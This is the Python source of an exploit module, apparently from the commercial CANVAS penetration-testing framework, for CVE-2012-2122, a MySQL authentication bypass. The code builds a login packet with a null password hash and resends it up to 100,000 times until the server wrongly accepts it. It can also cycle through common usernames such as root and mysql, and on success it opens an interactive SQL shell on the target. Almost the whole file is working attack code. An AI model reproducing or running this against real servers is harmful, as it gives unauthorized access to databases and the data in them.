#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
Error Notes:

    Null Packet Received: It looks like sometimes when authentication failed, instead of receiving
     an error packet, it receive a null packet.

    Bad Handshake: I couln't reproduce it on my testing environment, but looks like a connection
     problem on authentication time.

"""

import os
import sys
import stat
import time
import getopt
import struct
import socket

from StringIO import StringIO

if "." not in sys.path: sys.path.append(".")

import libs.mysqllib as mysqllib
import canvasengine

from exploitutils import *

from tcpexploit import tcpexploit
from sqllistener import mysqllistener
from SQLNode import SQLNode
from SQLShellServer import mysqlshellserver

NAME                            = "MySQL authentication bypass"
DESCRIPTION                     = "Authentication bypass with bruteforce"
VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Windows"], ["Linux"], ["Solaris"], ["FreeBSD"] ]

DOCUMENTATION                   = {}
DOCUMENTATION["Date public"]    = "09/06/2012"
DOCUMENTATION["OSVDB"]          = "http://www.osvdb.org/displayvuln.php?osvdb_id=???"
DOCUMENTATION["CVE Name"]       = "CVE-2012-2122"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2122"
DOCUMENTATION['CVSS']           = 10.0

DOCUMENTATION["Notes"]          = """

Mysql authentication can be bypassed by bruteforcing a wrong password until the server
misses a copy operation.

Originally reported at: http://seclists.org/oss-sec/2012/q2/493

"""

TIMEOUT = 20

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name      = NAME
        self.user        = "root"
        self.port        = 3306
        self.brute_users = False

        # You are invited to add more users here (for bruteforce mode):
        self.users     = ['root', 'mysql', 'mysqld', 'nobody', 'www', 'apache', 'httpd', 'db']

        self.setVersion(1)
        
    def neededListenerTypes(self):
        return []

    
    def getargs(self):
        self.getarg("port")
        self.getarg("user")
        self.getarg("brute_users")

    def test(self):
        self.getargs()
        self.host = self.target.interface
        
        s = self.gettcpsock()
        
        try:
            s.set_timeout(TIMEOUT)
            s.connect((self.host, self.port))
        except (socket.error, timeoutsocket.Timeout):
            self.log("No connection could be established")
            return 0
        finally:
            s.close()
              
        return 1

    def run(self):
        self.getargs()
        
        self.host = self.target.interface

        self.socknode = self.argsDict["passednodes"][0]
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port), showlog=1)
        
        success = False
                
        # No user bruteforce
        if not self.brute_users: self.users = [self.user]

        for user in self.users:
            self.log("Trying to connect with username: %s" % user)
            
            try:
                mysql = mysqllib.MySQL(41)
                r = self.force_authenticate(user, mysql)
                success = True
                break

            except mysqllib.error, msg:
                self.log('Error while bruting with user %s: %s' % (user, msg))
                mysql.close()
                continue

        if success:
            self.setInfo("%s attacking %s:%d (success)" % (NAME,self.host, self.port), showlog=1)
            node = SQLNode()
            node.parentnode = self.socknode
            shell = mysqlshellserver(mysql, node, logfunction=self.logfunction)
            shell.startup()
            node.startup()
            return node
        else:
            self.log("Failed: MySQL version not vulnerable.")
            self.setInfo("%s attacking %s:%d (failed)" % (NAME,self.host, self.port), showlog=1)
            return 0

    def force_authenticate(self, user, mysql):
        flag = 0

        flag |= mysqllib.CLIENT_LONG_FLAG
        flag |= mysqllib.CLIENT_INTERACTIVE   | mysqllib.CLIENT_LOCAL_FILES
        flag |= mysqllib.CLIENT_LONG_PASSWORD | mysqllib.CLIENT_SECURE_CONNECTION
        flag |= mysqllib.CLIENT_SECURE_CONNECTION
        
        buf  = struct.pack("H", flag)
        buf += mysqllib.pack_uint3(mysqllib.MAX_PACKETSIZE)

        buf += user + "\0"                                                                                        
        buf += chr(0x14) + "\0" * 0x14
                                                                                
        buf += "\0"
        buf = "\x85\xa6"+"\x03\x00\x00" + "\x00" +\
              "\x00\x01\x08\x00\x00\x00"+\
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+ user +"\x00\x14\x00\x00\x00\x00"+\
              "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; # continue NULL hash

        buf= mysqllib.pack_uint3(len(buf)) + '\x01' + buf

        retry_ = 100000
        retry  = 0
        
        while retry < retry_:
            retry += 1

            try:
                mysql.connect((self.host, self.port))      
                mysql._s.send(buf)
                return mysql.recv_packet()
            except mysqllib.error, msg:
                #if the error is not a login error OR the retry limit has been reached then raise the exception
                if "(1045)" not in str(msg).lower() or retry == (retry_ - 1) or self.state == self.HALT: 
                    raise msg
                else:
                    self.log('Request N %06d failed, %d retries left' % (retry, retry_ - retry))
        return False

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
